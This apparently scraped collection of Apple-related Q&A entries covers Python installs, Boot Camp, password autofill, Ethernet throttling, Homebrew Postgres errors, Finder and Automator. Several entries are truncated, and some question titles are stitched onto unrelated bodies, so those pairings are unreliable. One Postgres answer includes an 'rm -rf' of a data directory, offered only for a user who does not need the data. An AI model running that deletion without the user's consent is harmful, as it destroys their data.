part of the Command Line Tools, and you can install and use that.  Use the command line xcode-select --install to install the CLT.\nIf you choose to install a third-party build, I would recommend installing from python.org, not using homebrew.  Homebrew is invasive and makes other changes you may not want.\nThese will install python 3.x as python3, per PEP394 .\nWhen you use pip3, it will install packages into the library of the python that is running pip3, or into your $HOME if it can't write to site-packages.

You could do a clean install of Yosemite and then use the Boot Camp Assistant to install Windows 7. Apple intended the use of the optical drive when installing Windows 7 on your model Mac. If the optical drive is not an option, then you could try one of the legacy methods posted here a Ask Different. Some Macs can boot from an USB Windows 10 installer. If your Mac is capable of this, then you could use the CLI to install Windows 7 to your internal drive. Or, use the CLI to install Windows 10 instead.\nYou probably should install Windows to BIOS boot. If you also want macOS (OS X) installed, then you are going to need to use hybrid partitioning. This is where macOS (OS X) uses the GPT and Windows uses the MBR partition table.

How does a password manager know when to popup on my keyboard and which site/app’s password to filter out?\n\nA: \ncan a password manager app access and read everything that's displayed on my screen?\n\nShort answer, no.\nA password manager app doesn't get free rein access to anything and everything displayed on the screen of your iOS device.\nA very simplified explanation of how a password manager apps is as follows:\nAny app that uses a login flow, where a users credentials are verified and authenticated via a remote web service declares its associated domains in the app metadata. iCloud Keychain or any 3rd party password manager apps remains unaware of the installed 3rd party app, and only jumps into action when a user taps on the credentials input field. Since the app has declares its associated domains, a password manager app can filter from its own list of entries and only presents the credentials matching the domain.\niOS also uses heuristics to determine the available login credential information when the user logs in or creates new passwords, and automatically provides the password entry bar over the system keyboard.\nThe way password autofill architecture is designed, a password manager neither gets to read any app data, nor does it gets to see what's happening on the screen.\nYou can learn more about password autofill by following the linked document on Apple Developer website:\n\n*\n\n*https://developer.apple.com/documentation/security/password_autofill\nPassword autofilling recommends credentials only for the app’s associated domain, and the user would need to authenticate using Face ID or Touch ID before accessing the credentials.\n", "Q: Is it possible to replace an iMac Fusion Drive HDD with a bootcamp partition on it with an SSD using migration instead of reinstalling Windows?

So any idea on how i can set lower resolution in youtube safari ? (I know if i get youtube premium it will solve my problem but i don’t want to take YouTube subscription)\n\nA: If you are accessing YouTube through Safari browser, no - you can only choose the resolution YouTube shows you, and if it doesn't show anything less than 360p you are stuck with that. But there are some YouTube apps that allow you to always play videos at a set resolution. But they will have ads. (One way to partially block all ads on any app is to use DNS ad filtering, like AdGuard DNS, but it is also a privacy risk).\n\nA: If you are looking to avoid ads and also use YouTube mostly to listen to music/audio, you may consider getting a YouTube Premium subscription.\nYouTube Premium lets you browse completely ad free, and lets you playback any video using the native mobile apps in the background mode even with the device screen locked in sleep mode.\nWhen you turn off the device screen, YouTube app automatically and seamlessly transitions to only playing back audio, thereby also keeping your mobile data usage low compared to when playing back video. A good side effect would be that you'd be able to get more playback time due to reduced battery consumption.\n", "Q: What is the purpose of having a mac connected to an iPhone/iPad through bluetooth panel I am not talking about handoff or things like that, these work perfectly for me among all my devices, macs, iPhones, iPads, etc.\nI am talking about this: I have noticed an entry with my computer name inside the bluetooth preferences of my iPad and an entry with my iPad name inside the bluetooth settings of my mac.\nLike I said, everything like handoff, clipboard between devices, etc. were working fine.\nBoth entries were marked NOT CONNECTED. I clicked both and all connections now say CONNECTED? What is going on here? What can I do now that I could not before?\n\nA: The main feature is that your phone can create a Personal Hotspot via that Bluetooth connection. I.e. you can use your iPhone as an internet connection for you phone.\nIt is not that common to use Bluetooth for that purpose today as creating that Personal Hotspot over WiFi is both faster and more convenient given the user interface details that Apple put into that.\n\nA: Bluetooth can be used for many things - transfering files, creating a hotspot, connecting a device (like wireless headphones) etc.\nA very Apple specific way it is used is for Airdrop. AirDrop uses Bluetooth to create a direct wifi connection between devices. If you've used AirDrop to transfer file between your Mac and iPhone / iPad, entries for the device can appear in each others Bluetooth list.\n(Generally, to save battery, it is recommended to not keep Bluetooth on always-on mode, and use it only when needed).\n", "Q: How can I have Finder find a file for real?

I am on macOS Big Sur 11.6 on the Intel Core i9 if that helps.\nThe Ethernet cables connect to the Thunderbolt port via a dock supporting a 1 Gbps networking and my router, switch and modem all support 1 Gbps speeds.\n\nI have tried this with two other docks/Ethernet to Thunderbolt ports and can reproduce the issue.\nThe issue\nWhenever I restart the machine or I freshly connect the dock (or even just the CAT cable to the dock), I get the specified 1 Gbps speeds on my machine.\nHowever, after a few minutes of usage (this varies between 5 - 30 minutes), the speeds drop to 118 Mbps / 118 Mbps.\nIf I disconnect and reconnect the dock or the network cable, it sometimes fixes the issue and sometimes it doesn't and my speed is limited to 118 Mbps (exact).\nThe My Network → Advanced setting on my Ethernet looks like this:\n\nAnd it shows T1000 with duplex. I have tried all suggestions on various Apple forums like this one and they haven't worked for me.\nIt is like the Mac suddenly decides that it cannot support 1 Gbps and switches to 118 Mbps (why exact 118 Mbps though?).\n\nWhat setting can I check/change to fix this issue?\n\n-- Update 01 --\nAs per some suggestions, I ran an iperf3 test between two MBPs on\nthe local network and got about 940 Mbps.\nHowever, I also got the Internet speedtest hitting 900 Mbps when I ran\nthat next. I am not ruling out some local network issue. I'll rerun\niPerf once I see my Internet speed drop to rule out any local network\nissues.\n\nChecking for ISP caps via a secondary device over Wi-Fi\nWhen I get low speeds on my Ethernet, switching to Wi-Fi or testing on\nmy phone (over Wi-Fi), gives me substantially higher speeds - around\n200 - 300 Mbps. So I doubt it is an ISP cap (possible, but unlikely).\n\n\n-- Update 02 (and solution) --\nIt was not the Macbook but my router doing some QoS :|\nAfter encountering iPerf3 showing 940 Mbps and my Speedtest reporting\n118 Mbps, I started dismantling my network and connecting my Macbook\nat various levels right until I connected it directly to the modem. (Modem was 1 Gbps and router was 118 Mbps).\n(I had also procured a Windows machine and connected it to the LAN which was also capped at 118 Mbps. That proved that it was not the Mac\nbut something to do locally with my network.)\nTurned out that my router (I have a TP-Link Deco) has a QoS setting\nwhich is set at 120 Mbps and when a certain number of devices connect\n/ there is enough network activity, it restricts speeds to 120 Mbps.\n(Hence the 118 Mbps on speed tests).\nThe reason I was thrown off initially was because my phone was showing\nhigher speeds when my Macbook was being throttled.\nThis turned out to be due to the fact that my phone was registered as\na higher-priority device and the router skipped the QoS on it and\nallowed its full bandwidth.\n\n\n\nA: MacOS does not come with such a restriction. There's no built-in feature that limits transfer speeds to 118 Mpbs (or similar value) after while.\nYou can build such a feature yourself using the included pf packet filter, but I assume you have not done so.\nAs your network settings show that the speed negotiated between the ethernet port on the dock/Mac and the switch shows as 1000Base-T then you do have a 1 Gbps link.\nYou're using an unreliable way of determining speeds by using SpeedTest. I would not recommend that for testing speeds on your local network. You could simply be throttled at the server or ISP - i.e. after you have spent an amount of bandwidth over a small period over time, the server or ISP put in place throttling to ensure that you do not overuse their bandwidth.\nOne of the best tools for local network speed testing is iPerf3. I would recommend installing that, and then measure the network speed between your Mac and another device on your local network. Then you can isolate the cause of the throttling to be outside your local network.\n\nA: Check your network cable\nIf it's not a software based issue, it's likely hardware. I'd replace the network cable with a known good one. Even cables that look OK can have issues.\n\nA: Cables and dongles are always an easy ground zero to address. Try those and unless you have dedicated internet from your ISP, data caps are real. Look into the contract you have with your provider.\n\nA: Third-party macOS USB-C Ethernet adapters are apparently notorious for requiring excess CPU power on the host, due to driver issues and the lack of offloading support. Even if you've tried multiple Ethernet docks, it's quite possible that they're all using the same chipset and driver so perhaps changing docks doesn't tell you anything.\nHave you tried running Activity Monitor while running the transfer to see if the CPU is spiking at some point, and if so, does that correlate with the transfer speed? Or are you running other CPU-intensive tasks on the machine at the same time?\nI could even imagine a cascade of issues: for example, the CPU usage could cause thermal throttling to kick in and further reduce the amount of bandwidth available for the computations that cannot be offloaded to the external chipset.\nWhile on that subject, are you plugging in your hub on the left side or the right side?\nIn either case, as other answers have noted, it's best to test this locally. To rule out any problems with switches or routers, first find another computer with a GbE port on your network, plug a cable directly between the two (most GbE adapters supports auto-crossover so you can probably use a regular cable), and measure the transfer speed directly. (You could, for example, mount a directory and dump a file with \"dd\".)\n", "Q: Mobile devices: Does using a protection case decrease the life expectation of the battery? Some people say that using an iPhone-, iPad-, Watch-case does reduces the life expectation of the battery.\nI could imagine that it's true, because the heat drain becomes worse. On the other hand is the protection that the device gets from using a case beyond doubt.\nIs it proven, that protection cases decrease the life expectation of a battery?\nWhat's the general recommendation concerning protection cases? Does Apple self recommend it at all?\n\nA: You cannot answer your first question in general as it depends on the protection case itself.\nIf the protection case does not transfer heat adequately and contributes to a higher temperature phone - then yes, that would ever so slightly decrease the life expectancy of the battery.\nIf the protection case does transfer heat adequately - or more even better than adequately, it could make no difference for the life expectancy of the battery - or it could even increase the life expectancy of the battery.\nIn any case, if you use a \"normal\" protection case (i.e. don't use one made of 30 cm thick wool or something like that) - I wouldn't worry one bit about any impact on the life expectancy of the batteries.\nAs Apple themselves design, manufacture and sells various covers and cases, I'm sure that Apple doesn't in general have a problem with devices being protected in that fashion.\n", "Q: Alternative to Taply I've relied on Taply, a simple music player, since at least Leopard. The program is 32 bit and won't run on MacOs after Mojave. There is no 64 bit version of the program, which is no longer in development.\nIs there a 64 bit alternative?\n\nA: Looking at the blurb on https://www.macupdate.com/app/mac/15190/taply it would appear to do exactly the same as just tapping the spacebar in Finder…\n\nThe only difference being that you can't work in Finder whilst it's doing this, but you can work in any other app at the same time.\nI typed this answer, took & added the screenshot, then posted, all whilst the song was playing.\n\nA: If you can use the Terminal, try\nafplay foo.mp3\nand\nqlmanage -p foo.mp3\nThe last one does exactly what the Finder does when you press space on the file, with the benefit that you can continue use the Finder while the song is playing.\n", "Q: Right-click on Big Sur The right click/secondary click can no longer be called by clicking on the bottom right of the trackpad in Big Sur.

My computer is a Mac mini with M1 chip. I want to buy the Dell u4021qw monitor, but I have a concern: Does the computer actually work with this monitor (especially: does hidpi work? Does the font become unclear when using hidpi)?\n\nA: The 2020 M1 Mini supports up to 4096 by 2160 pixels at 60Hz (HDMI); and up to 6016 by 3384 pixels at 60 Hz (Thunderbolt).\nHiDPI simply uses the existing resolution, but scales things to a larger size. MacOS can usually scale any display.\nYour DELL monitor is 5120 x 2160, so will work over Thunderbolt/DisplayPort. MacOS will scale the display to a Retina equivalent of 2560 x 1080.\nThe sharpness of the image, or of font display,  is usually related to the pixel density. Your 40 inch display is 140 pixels per inch, so won't be as sharp as a MacBook Pro's 227 ppi, but is sharper than the non-Retina Apple Thunderbolt Display (109 ppi, 27\", 2560 x 1080).\n", "Q: homebrew. Cant start service. get \"Bootstrap failed: 5: Input/output error - Postgres - Mac I am trying to re-install Postgres via home-brew on Mac.\nI uninstalled Postgres, updated home-brew and ran the install command for brew install postgres\nwhen I run brew services start postgresql\nI get the below error message:\nBootstrap failed: 5: Input/output error\nError: Failure while executing; /bin/launchctl bootstrap gui/501 /Users/edac/Library/LaunchAgents/homebrew.mxcl.postgresql.plist exited with 5.\nWhen I try to start a server through the Postgres app I receive this message:\nRequired PostgreSQL version not installed\n\nThe data directory was initialized with PostgreSQL 13.\n\nThis copy of Postgres.app includes the following PostgreSQL versions: 14.\n\nPlease try downloading a different release of Postgres.app.\n\noriginally when I installed Postgres all I did was run the home-brew cli and install the app and I was good to go. Not sure what's gone wrong.\n\nA: I faced a similar problem with postgresql 11 and restarting the service did not help. The issue arose when my MacBook restarted abruptly.\nAfter checking the ports and trying out all the possible solutions, I decided to look into the logs.\ntail -n 100 /usr/local/var/log/postgresql@11.log\n\nThis gave me the last 100 lines of the log where I found this:\nFATAL:  lock file \"postmaster.pid\" already exists\nHINT:  Is another postmaster (PID 479) running in data directory \"/usr/local/var/postgresql@11\"?\n\nClearly, the issue was with postmaster.pid so I deleted it:\nrm /usr/local/var/postgresql@11/postmaster.pid\n\nStarted the postgres service again:\nbrew services start postgresql@11\n\nand voila! It worked.\n\nA: The issue is the previous install of postgres was postgres 13, and it created a database under:\n/usr/local/var/postgres\n\nwhich is now incompatible with the version of postgres you're installing, which is version 14.\nFirst question: Do you care about your data?\n\nIf not then you can simply delete that folder and attempt to restart the service.\n\nto delete and restart the service do:\nrm -rf /usr/local/var/postgres\ninitdb --locale=C -E UTF8 /usr/local/var/postgres\nbrew services start postgresql\n\nOtherwise you need to install postgresql@13, and perform a database migration, which can be summed up as follows:\ninstall older postgres, make sure it's stopped\nbrew install postgresql@13\nbrew services stop postgresql@13\nbrew services stop postgres\n\ndelete the postgres 13 database created by the installation of postgresql@13\nrm -rf /usr/local/var/postgresql@13\n\nmove old data to compatible driver folder:\nmv /usr/local/var/postgres /usr/local/var/postgresql@13\n\nNow we do the upgrade. First cd to the database folder\ncd /usr/local/var\n\nConstruct a new blank database, with locale C, encoding of UTF8\ninitdb --locale=C -E UTF8 -D postgres\n\nPerform the upgrade itself:\npg_upgrade -d postgresql@13 -D postgres -b /usr/local/Cellar/postgresql@13/13.4/bin -B /usr/local/Cellar/postgresql/14.0/bin -v\n\nThis should end in success. If it doesn't (e.g. locale/encoding is wrong), then chose the locale and encoding that matches the database.\nFinally restart the postgres service:\nbrew services start postgresql\n\n\nA: It seems that the postgresql is already started before running the start command.\nSo do restart it instead of starting, by the following command:\nbrew services restart postgresql\n\n\nA: I had this for Apache. To fix it, I unloaded the plist file. In your case\nlaunchctl unload /Users/edac/Library/LaunchAgents/homebrew.mxcl.postgresql.plist\nlaunchctl load /Users/edac/Library/LaunchAgents/homebrew.mxcl.postgresql.plist\n\nThen I re-ran the start services command and it worked.\nbrew services start postgresql\n\n\nA: The problem is really what @Petesh said. But, the resolution for me was simpler.\nWhen you upgrade your postgresql with brew, it logs a success message. One thing registered will be:\nTo migrate existing data from a previous major version of PostgreSQL run:\n  brew postgresql-upgrade-database\n\nSo the only thing you need to do is to run the command below:\nbrew postgresql-upgrade-database\n\nAnd of course you need to restart the service:\nbrew services restart postgresql\n\nIf you want to make sure it worked, you can run the start command too:\nbrew services start postgresql\n\n", "Q: Adding text between sublists in pages I'm facing difficulty with nested lists in the Pages app. I'm able to do the following easily.\n1.

Is it possible to change the sort order when viewing files in Finder in the symbol, column or slideshow view?\nI am going through pictures and sorting them by creation date.

When I switch to list view and change it by clicking on the column header, and switch back to any other view, it is the default again.\nIt seems really strange that this basic option is not possible. Am I missing something?\n\nA: Each View has its own set of options to sort by.\nList View is the most comprehensive, followed by Icon. All the others have very limited options.\nIn effect you can only sort on data you can 'see'.

Just wondering if anyone knows of a way to click the migration assistant option?\n\nA: The easiest and most reliable way to transfer your data would be to use Target Disk Mode (https://support.apple.com/en-gb/guide/mac-help/mchlp1443/mac)\nConnect your old MacBook to your new Mac with a Thunderbolt cable (alternatively you can use FireWire if your old Mac does not have Thunderbolt)\nThen make sure your old MacBook is off and start it up while pressing and holding the T key.\nYour old Mac will then be mounted like a regular external drive and you can either transfer your data by hand or use Migration Assistent (located in Applications > Utilities) on your new Mac.\n\nDepending on the model of your old MacBook another option would be to take out it's drive and get an enclosure to connect it via USB.\n\nAlso: Please start making Backups.

Is there a way to only customize certain function row keys while keeping all the other ones in tact, and if so, how to do this?\n\nA: To maintain the functionality of your other Special Function keys whilst also being able to map ExternalDisplayBrightness to, 'true' F-keys will require that you use them whilst holding the Fn Key.\n\nAssuming you set these to F1 & F2, then to action them you would press  Fn   F1  or  Fn   F2 \n", "Q: Rename files in subfolders by adding \"_ParentFolderName\" I have hundreds of Parent Folders, each containing a few subfolders.

I'm using the opportunity of a new Mac laptop to get to grips with automating the post-macOS-installation setup process, rather than going through the usual mind-numbing click-fest or crud-inheriting Migration Assistant.\nI read a few articles to get started, and most suggested using Homebrew but as a first step they recommended using brew to install mas (see github), the command-line interface to the Mac App Store. I'm making fair progress with that, but my question is this:\nWhen a particular package is available via both Homebrew and mas (and that often seems to be the case -- 1Password 7 is a current example), does it matter which one is used? (And if it does, what things should be considered when choosing?)\n\nA: Both the Mac App Store (to which the mas you mention is a command-line interface) and Homebrew are package managers in their own rights, only difference being that former comes from 1st party while the latter is a open-source, community developed one.\nThe end result in either case is almost the same (the app bundle getting installed under /Applications directory). Below are some differences in terms of how the package management (installation/uninstallation) gets affected in either case, which helps in making a decision with which one to choose:\n\n*\n\n*Using Homebrew lets one script and automate the package management.\n\n\n*Homebrew allows access to zap verb, which alongside uninstalling the app also deletes any associated metadata file(s).\n\n\n*Installing via Homebrew may let you gain access to the latest version of the app earlier than the Mac App Store, as the update released via latter wait for the approval from the App Store review team.\nOn the other hand, an update released via Mac App Store is assured to have passed through the review team.\n\n\n*Most often the apps made available via either would align in their version number (except for the brief period of time when the version numbers mismatch as an update waits for review), and you should be able to install it either way without much of a difference.\n\n\n*Unless if there's an app which is still available on the App Store, but no longer sees any updates, but gets updates via Homebrew, going either way would let you get access to the latest version.\nTaking into consideration all of the above, here's an approach that I take personally. If an app sees active updates on both the platforms, I prefer installing it via Homebrew over Mac App Store.\n", "Q: Default Drive/Volume icon... where can I find it?

I'm just wondering why the back of my MacBook Pro 2018 and, in general, all the backs of newest MBPs are magnetic (i.e., left and right sides under the pad).\n\nA: MacBooks use magnets to detect whether they are open or closed (and trigger the according actions like going to sleep/clamshell mode, etc.) and to magnetically keep the MacBook shut.\n", "Q: How to stop hiss on computer microphone? I'm using an external microphone (iUKUS) with a 3.5mm audio jack plugged into my computer (a high-end Mac). There's a bit of hiss in background - how do I stop it - is there a way to filter that in real-time (on input, not by processing the audio recording later)?\n\nA: Looking at the spec on Amazon & the complaints about this mic, I think you should send it back.\nIt's designed to look like a cheap low impedance large diaphragm condenser, but in actual fact is an even cheaper high impedance electret condenser [that's the kind of thing you get in a headset].\nIt needs plugin power of 1.5v from the Mac, just like a headset mic.\nOn to the bit they hid right at the bottom of the page… S/N [signal to noise] ratio \"More than 36dB\"!!\nI should really hope so… that is possibly the worst S/N figure I have ever seen on a piece of audio equipment. You would hope for 60dB even on a poor mic.\nThe hiss you are hearing is very likely, based on that figure, being actually generated by the mic itself, so there is nothing you can do to fix it.\nThere's a good, easy-to-read article explaining signal to noise ratio at MyNewMicrophone - What Is A Good Signal-To-Noise Ratio For A Microphone?\nIf you want to replace this mic with something better but still as cheap,then maybe such as a Neewer NW700* [this mic comes in many guises with many names & numbers but it's the same thing underneath] for about the same price - but you must get a USB microphone pre-amp & a new XLR-XLR cable before you can successfully plug it into a computer. [They always fail to tell you this in the instructions].\nYou can get it packaged with a phantom power supply… but you still need to be able to get it into the computer cleanly, so avoid those & get a dedicated USB preamp.\nI see that they now make a straight to USB version of this. I have no experience with this one, but it ought to work in theory, as the USB can provide the power the mic needs. Sight unseen, I'd be tempted to go for this type.\n*I bought one of these a few years ago just so I could answer the myriad questions we see on here & on our sister site, Sound Design about it & similar mics. I'd hardly swap it for my £2,500 Neumann U87, but to be honest…  it's not terrible.\n", "Q: How can I connect my macOS to docker network minikube?

You seem to be leaving out what you have actually tried, which makes it very hard to help you there.

It is Apple's IP address, but I would like to stop it. I have disabled analytics for Apple etc. but it is still sending some data outside. Could someone help me, how to solve this problem? In activity monitor -> network, there isn't any process with these number of packets.\n\nA: An easy way to monitor and block outgoing traffic from your Mac is by installing and using Little Snitch:\nhttps://www.obdev.at/products/littlesnitch/index.html\nYou can use the free trial period to try to discover what program is the source of those data transfers.

While I can record just fine with a 3.5mm jack microphone, any recording from the USB microphones (via Zoom, Quicktime, whatever) comes in with a stutter - like, parts of the recording are either missing or sort of jammed on to the previous part of the sound. What is going on, how to fix that?\n\nA: Does it come with a control panel of any sort? Sounds like you need to raise the buffer so it can keep up - basically the computer is 'too busy' to process realtime.\nAlternatively, try changing the input sample rate in Utilities > Audio MIDI Setup\n\nRates may be variable between 16k right up to 48, 96 or 192k, depending on the device capabilities. Zoom, Skype etc don't really need more than 32k. The lower the figure, the easier it is to process.\n", "Q: Cloning a Catalina Intel Mac to a M1 We're using an Intel Mac mini running Catalina as a build machine, running a lot of specific and custom software.\nWe want to update that build machine to Big Sur in order to build apps for the latest iOS, unfortunately we're out of disk space on that machine (128GB model).\nManagement took the opportunity to upgrade and bought a Mac mini M1 to replace it, expecting to clone or restore a Time Machine on the new machine.\nWe have a huge technical debt on this, the person building it has left and is no longer in contact with our company, so rebuilding manually on the new mac is not a realistic option without spending a lot of resources on it.\nIs there any way to clone the filesystem on the new machine and have it work \"out of the box\"?\nA direct clone is not going to work since only Big Sur and up is supported on M1 (if I remember correctly,) but maybe cloning on a bigger external drive, updating macOS, creating another clone of that and restoring it on the new machine?\nHas that any chance to work?\n\nA: You should be able to Migrate directly from one Mac to the other, over Ethernet/WiFi etc. The older machine doesn't need to be on the same OS* [otherwise you'd get really stuck if the old machine was simply no longer upgradeable]. This even works from PC to Mac, though without apps etc, just documents.\nAfter migration you will see which, if any, apps couldn't be successfully migrated - this all without touching the original Mac.\nSee Apple KB - Move your content to a new Mac for full details.\n*The Apple KB says to upgrade to the latest OS first, but this isn't necessary. I migrated an old High Sierra Mac Pro to a new Big Sur M1 iMac only a few months ago.\n", "Q: Connecting two 27\" Cinema Displays to a 16\" MacBook Pro I have a 16\", MacBookPro with 4, USB-C ports.\nI also have a 27\", Cinema Display with a USB-Type A (audio), MiniDisplay (video), and MagSafe power connectors.  At the rear, it has three, USB-Type A ports.\nCurrently, I use a ULTRADRIVE Kit USB-C™ Multi-Display Modular Dock to connect the monitor to the computer.\nI'd like to connect a second, 27\" Cinema Display to my laptop.  It appears that there is a newer model (https://support.apple.com/kb/SP642?locale=en_US) that has more connectivity options.\nI'd like to know if I can \"daisy chain\" the older, 27\" monitor, to the \"newer\" 27\" monitor, then connect it to the computer, using this adapter.  Put another way, will this architecture work?  Will both monitors run at their highest resolution rates?  Will the power, supplied directly to the \"newer\" monitor be passed to the older monitor and the computer?\nI know there are a number of other questions that appear to be similar, but none answer my specific questions.\n\nA: No, this combination will not work.\n\n*\n\n*The Apple Thunderbolt Display (i.e. \"the newer model Cinema Display) works only via Thunderbolt (which your Ultradrive does not offer). To connec the Thunderbolt display you have to use a Thunderbolt 3 to Thunderbolt 2 adapter (and connect it directly to your Mac or a Hub/Dock that support Thunderbolt).\n\n*While 2 Thunderbolt Displays can be daisy-chained, you cannot daisy-chain a Cinema Display directly to a Thunderbolt Display (workarounds exists where a Dock is placed in between (MacBook > TB3/2 Adapter > TB Display > Dock/Hub > Cinema Display))\n\n\nIf you require a One-Cable solution you would need a Dock that connects to your MacBook via Thunderbolt 3 and offers:\n\n*\n\n*1 Thunderbolt Port\n\n*1 Video Out Port (preferably Mini-DisplayPort)\n\n*Any other ports you need that are not already covered by the Displays integrated hub.\n\n*Power Delivery for charing your MacBook\n\nThere are multiple Docks that offer these features (OWC, Belkin, CalDigit being amoth the most popular) but they are typically pricier than USB-C solutions without Thunderbolt support.\n", "Q: HOW TO filter SubFolders' Files in Finder? I have SubFolders inside my ParentFolders and I need to filter just the Files inside all Subfolders like seen below:  (I don't need to filter the Folders, I need to filter the FILES inside the Folders)\n\nI spent the last 2 hours trying to find a way and I ran out of options.\nAnyone can offer some help?\nThanks!\nDaniel\n\nA: There's a reasonably simple way to do this manually.\nOpen one folder above the the topmost folder in List View.\nOpt/click the reveal arrow of your work folder. This will open the entire hierarchy.\nScroll to the bottom of the contents.\nShift-click the last item. This will select everything in that hierarchy.\nRight click any of the selected items - add your tag.\n\nThen open a new Finder Window.\nSelect your tag in the sidebar.\nPress  Cmd ⌘   J  and Group by Kind.\nThis will sort the folders to the top.\nShift/select all the folders.\nRight click & remove the tag.\n\nOf course, whilst you're in this view you can add any other tags you wish & re-filter on those later.\n\nA: Alternate Solution\nI would use Terminal with the find command in conjunction with the third-party utility tag to find and tag the target files, as IMO this would would be the easiest way to do it.\nAssuming all the Parent Folders are themselves within a folder, e.g. Parent of Parent Folders, then the following example shell script code will do as you want:\nfind '/path/to/parent_of_parent_folders' -type f -regex '.*/target_folder_name/.*' -exec echo '/path/to/tag' -a 'Finalizado' {} \\;\n\n\n*\n\n*Note that the example shell script code has an echo command in it for testing. Run it with the echo command to see that the files that tag will be executed on are the correct ones. If it looks right, remove the echo command and run again to actually tag them.\n\n\n*The '/path/to/parent_of_parent_folders' is the fully qualified POSIX pathname of the folder the e.g. ParentFolder1 and ParentFolder2 shown in your drawing. example: '/Users/Daniel4321/Documents/My Book'\n\n\n*target_folder_name in .*/target_folder_name/.*' would be Sub Folder 2 in your drawing, or \"3_Finished\" from your comments.\n\n\n*'/path/to/tag' is the fully qualified POSIX pathname of the tag executable if not placed within the PATH passed to the shell in Terminal. On my system I installed it to /usr/local/bin/tag and in Terminal only needed to use it as tag, omitting the /path/to/ portion in the example shell script code.\nNote that the example shell script code was tested in Terminal with actual paths and target folder name under macOS Catalina with Language & Region settings in System Preferences set to English (US) — Primary and worked for me without issue1.\n\n*\n\n*1  Assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\nThe 'Finalizado'1 tag was added to the target files.\n1The 'Finalizado' tag was taken from your other question: How to TAG all Files inside hundreds of Folders\n", "Q: Automator steps to create relative path to parent folder Directory structure....\n--G\n - Action.app (this Automator app)\n - Random.app\n\n - Folder 1\n  - File A.a\n  - File B.t\n  - File C.q\n\n - Folder 2\n  - File D.a\n  - File B.t\n  - File C.q\n\nI click-drag Folder 1 and Folder 2 and drop them on Action.app. (The names of these folders are always different).\nThe Action.app moves all files in the folders to the parent directory then deletes the folder. Duplicate files are overwritten during move. So I end up with:\n--G\n - Action.app (Automator app)\n - Random.app\n  - File A.a\n  - File D.a\n  - File B.t\n  - File C.q\n\nThis works....\n\n\nWhat I'm trying to accomplish....\nThe above automator action has the parent folder hard-coded in the steps - --G – that's the parent folder. I want to remove that hard coded folder and make it relative to the items I've dragged (or location of the action.app). That way I can place this action in any directory and run it.\nI have searched quite a bit and tried, I think, every question here regarding \"getting parent folder\" and none of them seem to work, using Applescript, shell scripts, etc. for this basic instance. In fact, one of the shell solutions started moving files and deleting directories on the startup volume/desktop (ooof!).\nI've tried the following...\n\nThis does set the parentFolder variable to the parent directory's name (verified in results).\nBut the variable parentFolder is not an option for the Move Finder Items step.\nIf I don't \"ignore input\" after setting the variable, then everything in the parent folder is processed (breaking the apps, because \"Contents\" is extracted from them) - the drag/drop doesn't target specific folders.\nI realize I'm probably overlooking something simple. Any help?\nIn case: Mojave 10.14.6 / Automator 2.9\n\nA: A couple things stand out for me. I'm using Sierra so YMMV.\nFirst, instead of using a generic variable, try using Path. It is intended for file locations and it might make a difference. Second, you might re-order your actions slightly. See below.\nUpdate 1: Now an application; Should move only selected subfolders;\nSince you intend to drop folders on it, I removed the initial 'get selected…'. Save as an application and it should default to receiving files and folders as input.\n\n*\n\n*Run Applescript -- Use yours, as is. Result should be an alias referring to the parent (and destination)\n\n\n*Set Value of Variable -- Use the 'Path' variable. The result should\nbe the alias from the applescript but as a single-item list\n\n\n*Get Selected Finder Items -- Check 'ignore…'; result should be the selected sub-folders, but not the parent\n\n\n*Get Folder Contents -- Check 'repeat for…', should result in selected\nsub-folders and their contents\n\n\n*Filter Finder Items -- All > Kind is not folder; will result in all\nfiles but no sub-folders\n\n\n*Move Finder Items -- Drag 'Path' onto the 'To:' dropdown; Check\n'replacing…'; should result in same files as previous action but moved to the parent folder\n\n\n*Get Selected Finder Items -- Check 'ignore…'; All files from previous\naction will be ignored and results should be the now-empty sub-folders\n\n\n*Move Finder Items to Trash -- Sub-folders from previous action should\nnow be in trash but the action will not list any results.\nSomething you can try in a workflow. There is a View Results action. Insert one after 'run applescript' and remove everything after. When you run the script, it will show you the results. You can then add the 'set variable' action and move the 'view results' below it and run the script again. You should see that both actions have the same results… i.e. the parent folder of item 1 of your selection. I find variables to be rather opaque and this can help clarify what is going on.\nUpdate 2:\nTo aid with visualization, here is a capture of a functional workflow. The key is to use the Path variable.

I wish to work with them on my computer without merging them with the cards already in my computer's Contacts. Each Contacts file is ~300 entries, and there is some overlap. The job I want to do involves only the already-exported cards in the .vcf file, and not the cards on my computer. Getting my computer's Contacts.App to work with a different data file, or importing the new data into a separate Contacts.app group, or importing the new data in a manner that would subsequently allow me to remove the new data from my Contacts.app, would all be suitable approaches.\nApple's help pages don't address the issues of segregation or multiple data sources. Searching the net doesn't find a solution either.\nHow might I import these cards, do the work, and then be able to remove them? I could import the other computer's cards then work with them in my computer's \"Last Import\" smart group, but importation seems to require merging the incoming cards with the existing cards. I don't want to do that, because I don't see how I might remove the newly-added cards (when I'm done with the job) other than card-by-card manually.\n\nA: As .vcf files are text files, they can be manipulated them from Terminal with any of the command line utilities available to manipulate text files.\nOr one can temporarily create another user account and do it from that account. Then when finished delete that account after backing up the data to another location not within the account to be deleted.\nAnother method is to use a virtual machine.\n\nA: I just had to go through this.

Recently Mac Mail started requesting the password for my MSN mail account and refusing the correct password when entered. I'm 100% certain the password is correct (I've used to to log in on iOS in Mail and Outlook, and on macOS in Safari, Chrome, and Firefox). Only Apple's Mail client is refusing the password.\nWhat could cause Apple Mail to refuse a correct password that's accepted everywhere else?\n\nA: I’d start with the connection doctor to see details:\n\n*\n\n*https://support.apple.com/guide/mail/use-connection-doctor-mlhlp1189/mac\nHard to guess where your setup or config is off without some details.\n", "Q: Charging Macbook Air With 5V 2.4A Power Bank I recently bought a X-Dragon 500,000mAH Solar Charger (Input: 5V 2A, Output: 5V 2.4A) for me to use on camping trips.  I plug it in via the USB-C cable and nothing seems to happen.\nIs there hardware or an adapter that will charge my 2021 Macbook Air?\n\nA: The specifications show it should work, so you may need to charge it up fully from the wall to validate that when it’s charged, it puts out USB PD. Are you able to get a detailed power level and then shut down the Mac and let it charge for an hour and recheck?\nSolar charging isn’t generally ideal for portable computers.\n\n*\n\n*X-Dragon 500,000mAH Solar Charger\n\nOn amazon, this product says it’s only for emergency use, and not for routing charging in general. It seems more designed for phones than computers.\n\ncharging is designed for emergencies, not a primary source of charging due to the compact solar panel size and sunlight intensity, it takes long time to charge under sunlight, so we highly recommend charge the solar charger via an adapter or computer, which only take a about 9.5 hours.\n\nSo it’s asking you to charge it from your Mac, not the other way around. You should still see some charge, power off your mac, 